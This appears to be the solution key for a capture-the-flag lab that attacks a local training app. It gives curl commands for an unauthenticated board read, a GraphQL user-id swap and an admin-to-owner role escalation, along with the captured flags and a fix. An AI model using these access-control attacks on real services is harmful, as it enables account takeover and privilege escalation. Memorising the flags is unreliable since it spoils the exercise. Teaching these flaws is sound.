# SOLUTION — Lab-10

```bash
H="Authorization: Bearer bob-token"

# 1) unauthenticated board read (NO header at all)
curl http://127.0.0.1:8010/simulator/board-2002
# -> 200 + history incl. FLAG{board_id_is_not_authorization}

# 2) GraphQL id swap -> rename another user
curl -X POST http://127.0.0.1:8010/graphql -H "$H" -H "Content-Type: application/json" \
 -d '{"query":"mutation { updateUser(id:\"u-alice\", name:\"Pwned\") }"}'
# -> {"renamed":"u-alice",...,"by":"u-bob"}

# 3) role tampering Admin -> Owner (UI says only "member" is assignable)
curl http://127.0.0.1:8010/board/board-1001/members -H "$H"
# -> {"your_role":"admin","assignable_roles":["member"],...}
curl -X POST http://127.0.0.1:8010/graphql -H "$H" -H "Content-Type: application/json" \
 -d '{"query":"mutation { updateMemberRole(boardId:\"board-1001\", userId:\"u-bob\", role:\"owner\") }"}'
# -> 200 + FLAG{admin_to_owner_by_tampering_role}

# 4) spend the new role: owner-only billing page
curl http://127.0.0.1:8010/board/board-1001/billing -H "$H"
# -> 200 + billing + transfer + flag
```

**Root cause:** identifiers accepted as authorization, never correlated to the JWT.
**Fix:** ownership/membership check per object + server-side max-grantable-role
(`requester.role == owner` required to grant `owner`).
